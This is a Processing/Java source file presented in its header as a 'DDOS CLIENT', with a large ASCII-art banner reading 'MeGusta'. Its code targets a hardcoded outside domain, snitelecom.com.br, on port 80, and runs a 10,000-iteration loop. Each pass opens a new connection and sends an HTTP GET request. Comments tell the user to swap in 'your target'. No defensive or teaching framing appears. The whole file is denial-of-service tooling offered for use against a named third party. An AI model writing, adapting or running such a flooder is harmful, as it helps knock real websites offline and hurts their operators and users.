/**
 * DDOS CLIENT
 * CHANGE URL AND P VARIABLES TO YOUR TARGET 
 * THIS PROGRAM STILL IN IT'S 'ALPHA' VERSION
 * EXPECT CHANGES
 * BY MeGusta/Zé Da Pipoquinha
 * "HTTP ACIMA DE TUDO,
 * DDOS ACIMA DE TODOS"
 * 
 * "As we fade into the night,
 * Who will tell the story of your life?"
 */
 

import processing.net.*;
Client c;
String data;
String url = ("snitelecom.com.br").trim();
int p = 80;
void setup() {
  String a1 = "MMMMMMMM               MMMMMMMM                            GGGGGGGGGGGGG                                            tttt                            ";
  String a2 = "M:::::::M             M:::::::M                         GGG::::::::::::G                                         ttt:::t                            ";
  String a3 = "M::::::::M           M::::::::M                       GG:::::::::::::::G                                         t:::::t                            ";
  String a4 = "M:::::::::M         M:::::::::M                      G:::::GGGGGGGG::::G                                         t:::::t                            ";
  String a5 = "M::::::::::M       M::::::::::M    eeeeeeeeeeee     G:::::G       GGGGGGuuuuuu    uuuuuu      ssssssssss   ttttttt:::::ttttttt      aaaaaaaaaaaaa   ";
  String a6 = "M:::::::::::M     M:::::::::::M  ee::::::::::::ee  G:::::G              u::::u    u::::u    ss::::::::::s  t:::::::::::::::::t      a::::::::::::a  ";
  String a7 = "M:::::::M::::M   M::::M:::::::M e::::::eeeee:::::eeG:::::G              u::::u    u::::u  ss:::::::::::::s t:::::::::::::::::t      aaaaaaaaa:::::a ";
  String a8 = "M::::::M M::::M M::::M M::::::Me::::::e     e:::::eG:::::G    GGGGGGGGGGu::::u    u::::u  s::::::ssss:::::stttttt:::::::tttttt               a::::a ";
  String a9=  "M::::::M  M::::M::::M  M::::::Me:::::::eeeee::::::eG:::::G    G::::::::Gu::::u    u::::u   s:::::s  ssssss       t:::::t              aaaaaaa:::::a ";
  String a10= "M::::::M   M:::::::M   M::::::Me:::::::::::::::::e G:::::G    GGGGG::::Gu::::u    u::::u     s::::::s            t:::::t            aa::::::::::::a ";
  String a11= "M::::::M    M:::::M    M::::::Me::::::eeeeeeeeeee  G:::::G        G::::Gu::::u    u::::u        s::::::s         t:::::t           a::::aaaa::::::a ";
  String a12= "M::::::M     MMMMM     M::::::Me:::::::e            G:::::G       G::::Gu:::::uuuu:::::u  ssssss   s:::::s       t:::::t    tttttta::::a    a:::::a ";
  String a13= "M::::::M               M::::::Me::::::::e            G:::::GGGGGGGG::::Gu:::::::::::::::uus:::::ssss::::::s      t::::::tttt:::::ta::::a    a:::::a ";
  String a14= "M::::::M               M::::::M e::::::::eeeeeeee     GG:::::::::::::::G u:::::::::::::::us::::::::::::::s       tt::::::::::::::ta:::::aaaa::::::a ";
  String a15= "M::::::M               M::::::M  ee:::::::::::::e       GGG::::::GGG:::G  uu::::::::uu:::u s:::::::::::ss          tt:::::::::::tt a::::::::::aa:::a";
  String a16= "MMMMMMMM               MMMMMMMM    eeeeeeeeeeeeee          GGGGGG   GGGG    uuuuuuuu  uuuu  sssssssssss              ttttttttttt    aaaaaaaaaa  aaaa";

System.out.println(a1);
System.out.println(a2);
System.out.println(a3);
System.out.println(a4);
System.out.println(a5);
System.out.println(a6);
System.out.println(a7);
System.out.println(a8);
System.out.println(a9);
System.out.println(a10);
System.out.println(a11);
System.out.println(a12);
System.out.println(a13);
System.out.println(a14);
System.out.println(a15);
System.out.println(a16);
 size(200, 200);
  System.out.println("Trying to listen to "+url +" on port: "+p);
    System.out.println("...");
   for(int ac=0;ac<10000;ac++){
               System.out.println("Request number "+ac);  
 System.out.println("Already Slow??");
    //for(int ca=0;ca<10;ca++){
     c = new Client(this,url , p);
    c.write("GET / HTTP/1.0\r\n");
    c.write("\r\n");
    try{
Thread.sleep(100);
}
catch(InterruptedException ex){
  System.out.println(ex);
}
   

     
    }
  }
